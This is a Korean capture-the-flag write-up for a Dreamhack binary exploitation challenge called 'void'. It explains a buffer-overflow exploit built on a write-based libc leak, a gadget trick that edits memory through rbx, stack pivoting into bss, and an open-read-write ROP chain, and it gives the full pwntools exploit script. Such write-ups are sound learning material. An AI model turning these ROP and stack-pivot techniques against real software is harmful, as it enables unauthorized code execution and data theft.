익스 코드를 봐도 내가 아니며 코드의 의도를 알 수 없기 때문에 흐름을 써보겠다.
`bof`가 조금 나고 카나리가 없다. 바이너리 pie가 없긴 한데 쓸만한 가젯이 없다. 일단 내가 보기엔 없어보였다. 그래서 `pop rdi` 문제처럼 `bss`에 `libc` 함수를 하나 만들어서 쓴다. 여러 가지가 가능할 거 같아서 어떤 함수를 만들까 고민했는데 간단하게 `write` 함수를 만들어서 `libc` 릭을 할려고 했다.
`write` 함수를 실행할 수 있다고 하자. 그럼 `libc` 함수를 출력해야 하므로 `rdi`, `rsi`, `rdx`를 변경해야 한다. `rdi`는 `main`에서 변조가 가능한데, 나머지 두 개가 문제다. `write` 내부를 보면 다음과 같은 로직이 있다.
```
0x0000000000114a44 <+36>:    mov    QWORD PTR [rsp+0x18],rdx
0x0000000000114a49 <+41>:    mov    QWORD PTR [rsp+0x10],rsi
0x0000000000114a4e <+46>:    mov    DWORD PTR [rsp+0x8],edi
0x0000000000114a52 <+50>:    call   0x90a70
0x0000000000114a57 <+55>:    mov    rdx,QWORD PTR [rsp+0x18]
0x0000000000114a5c <+60>:    mov    rsi,QWORD PTR [rsp+0x10]
0x0000000000114a61 <+65>:    mov    r8d,eax
0x0000000000114a64 <+68>:    mov    edi,DWORD PTR [rsp+0x8]
0x0000000000114a68 <+72>:    mov    eax,0x1
0x0000000000114a6d <+77>:    syscall
```

윗 부분과 아랫 부분이 어떤 행동을 하는지 감이 올 것이다. 여기서 `rdx`랑 `rsi`를 불러오는 `bss`에 값을 입력하고 `write + 46`으로 뛰면 `rsi`, `rdx`를 원하는대로 설정할 수 있다.
근데 이러면
`add dword ptr [rbp - 0x3d], ebx ; nop ; ret`
이 가젯을 4번 써야 한다. 정말 귀찮았다.

`libc` 릭이 끝났다. 이제 `pop rsi ; ret`과 `syscall` 가젯이 있다. 근데 `pop rdi ; ret` 가젯이 없다. 사실 있는데 필자가 이 문제를 8시간 째 푸는 중이라 정신이 없는 상태에서
`ROPgadget --binary libc.so.6 | grep "pop rdx ; ret"`
이렇게만 찾고 없어서 그냥 없다고 착각해버렸다. 그래서 `pop rdx` 가젯 없이 orw 코드를 짜야했다. `open`은 `rdx`를 안 쓰니까 그냥 하고, `bss`에 값을 의도적으로 넣어서 스택 이동을 생각해주면 `main`의 `read`를 방금 열은 `flag`파일을 읽는데 사용하고 다시 `ROP`를 할 수 있게 된다. `write`는 `rdx`가 필요해서
`0x000000000009133b : xor dh, 0x80 ; syscall`
이 가젯을 사용했다. `syscall` 실행 후에 바로 터지던데 어짜피 출력했으므로 상관없다.

`rbx` 컨트롤 트릭을 사용하는 문제는 원래 스택 사용이 복잡해서 코드가 더러운데, `pop rdx` 가젯 없이 익스한 관계로 `write` 트릭도 신경쓰느라 머리가 너무 아팠다. 근데 `write` 트릭은 실제 씨텝에서도 쓸만할 듯

# exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./void')
p = remote('host1.dreamhack.games', 10710)
e = ELF('./void')
l = ELF('./libc.so.6')
bss = e.bss() + 0x1000
main = 0x4013C8
leave_ret = 0x40137e

def main_func(num : int, payload : bytes):
    sleep(0.5)
    p.sendline(str(num).encode())
    sleep(0.5)
    p.send(payload)

payload = b'a' * 0x70 + p64(bss + 0x3500) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x2500) + p64(main + 0x32) + p64(bss + 0x1000) + p64(main + 8)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x1500) + p64(main + 0x32) + p64(bss + 0x3510) + p64(leave_ret)
main_func(1, payload)

payload = p64(main + 5) * 14 + p64(bss + 0x500) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x700) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x30 + (p64(bss + 0x5d0) + p64(main + 0x32)) + (p64(bss + 0x5e0) + p64(main + 0x32)) + b'a' * 0x10 + (p64(bss + 0x600) + p64(main + 0x32)) + p64(bss + 0x500) + p64(main + 0x1c) + p64(bss + 0x620) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x700 + 0x10) + p64(leave_ret)
main_func(1, payload)

payload1 = (l.sym['write'] + 46 - (0x00007f3085641117 - 0x7f308552c000)) & ((1 << 32) - 1)
# 0x000000000040121c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload2 = b'a' * 0x70 + p64(0x406488 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(0x4056e0) + p64(leave_ret)
main_func(1, payload)

payload1 = -0x19999999 & ((1 << 32) - 1)
payload2 = b'a' * 0x70 + p64(0x406494 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(0x4056f0) + p64(leave_ret)
main_func(1, payload)

payload1 = (main - 0x99999999) & ((1 << 32) - 1)
payload2 = b'a' * 0x70 + p64(0x406490 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(0x405710) + p64(leave_ret)
main_func(1, payload)

payload1 = 8
payload2 = b'a' * 0x70 + p64(0x4064a8 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x70 + p64(bss + 0x700) + p64(main + 0x1c)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x500) + p64(main + 0x1c) + p64(bss + 0x620) + p64(main + 0x32)
main_func(1, payload)

payload = b'a' * 0x70 + p64(bss + 0x700 + 0x10) + p64(leave_ret)
main_func(1, payload)

payload1 = e.got['read']
payload2 = b'a' * 0x70 + p64(0x4064a0 + 0x3d) + p64(0x000000000040121c) + p64(main)
main_func(payload1, payload2)

payload = b'a' * 0x5c + p32(2 + 0x31337 - 1) + b'a' * 0x10 + p64(0x406480) + p64(leave_ret)
main_func(1, payload)
l.address = u64(p.recvn(8)) - l.sym['read']
print(hex(l.address))

pop_rax = l.address + 0x0000000000045eb0
pop_rdi = l.address + 0x000000000002a3e5
pop_rsi = l.address + 0x000000000002be51
syscall = l.address + 594838
xor_dh_80_syscall = l.address + 0x000000000009133b
ret = 0x000000000040101a

# flag : 0x4074c0
payload = p64(bss + 0x2510) + p64(pop_rdi) + p64(0x4064b8) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) + p64(main + 0x50) + b'a' * 0x20 + (b'flag' + b'\x00' * 4) + p64(0x406450) + p64(leave_ret)
main_func(1, payload)

payload = p64(pop_rdi) + p64(2) + p64(pop_rsi) + p64(0x4074c0) + p64(pop_rax) + p64(1) + p64(xor_dh_80_syscall) + b'a' * 0x38 + p64(0x405fb0 - 8) + p64(leave_ret)
main_func(1, payload)
p.interactive()
```